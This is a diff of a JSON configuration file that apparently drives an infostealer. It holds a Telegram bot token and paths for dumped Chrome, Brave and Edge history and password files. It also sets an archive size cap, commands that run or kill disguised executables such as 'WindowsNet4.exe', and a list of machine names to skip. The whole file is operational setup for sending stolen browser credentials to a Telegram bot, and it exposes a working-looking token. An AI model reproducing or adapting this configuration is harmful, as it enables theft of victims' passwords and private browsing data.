@@ -1,12 +1,12 @@
 {
   "botToken": "7805542768:AAHg6PTQMX8eWE2S0I4bKxc-WHBoioAIA9I",
-  "hstChrFilePath": "c:\\temp\\cr_hi.txt",
-  "pasChrFilePath": "c:\\temp\\cr_pr.txt",
-  "hstBrvFilePath": "c:\\temp\\bv_hi.txt",
-  "pasBrvFilePath": "c:\\temp\\bv_pr.txt",
-  "hstEdgFilePath": "c:\\temp\\eg_hi.txt",
-  "pasEdgFilePath": "c:\\temp\\eg_pr.txt",
-  "logFilePath": "c:\\temp\\string.txt",
+  "_hstChrFilePath": "c:\\temp\\cr_hi.txt",
+  "_pasChrFilePath": "c:\\temp\\cr_pr.txt",
+  "_hstBrvFilePath": "c:\\temp\\bv_hi.txt",
+  "_pasBrvFilePath": "c:\\temp\\bv_pr.txt",
+  "_hstEdgFilePath": "c:\\temp\\eg_hi.txt",
+  "_pasEdgFilePath": "c:\\temp\\eg_pr.txt",
+  "_logFilePath": "c:\\temp\\string.txt",
   "_tempFolderPrefix": "C:\\temp\\temp_",
   "maxArchiveSizeMB": 49,
   "licenseYear": 2026,
@@ -36,6 +36,6 @@
   "___________kill exe ______cmdCommandsList": ["@echo off","C:\\Temp\\WindowsNet4.exe"],
   "___________kill any exe filename starts with______cmdCommandsList": ["@echo off","C:\\Temp\\WindowsNet*.exe"],
   "___________kill any exe filename starts with________cmdCommandsList": ["@echo off","C:\\Temp\\WinSrv*.exe"],
-  "skippedPcsList": ["min","DESKTOP-NCO579D","Sac","DESKTOP-BEVO3CC","husn","DESKTOP-5AHVE9S","sjd","DESKTOP-GPNKIVM","exp","_DESKTOP-V15VGOT","osm","_DESKTOP-5M9D8EK"]
+  "skippedPcsList": ["min","DESKTOP-NCO579D","Sac","DESKTOP-BEVO3CC","husn","DESKTOP-5AHVE9S","sjd","DESKTOP-GPNKIVM","exp","DESKTOP-V15VGOT","osm","_DESKTOP-5M9D8EK"]
   
 }
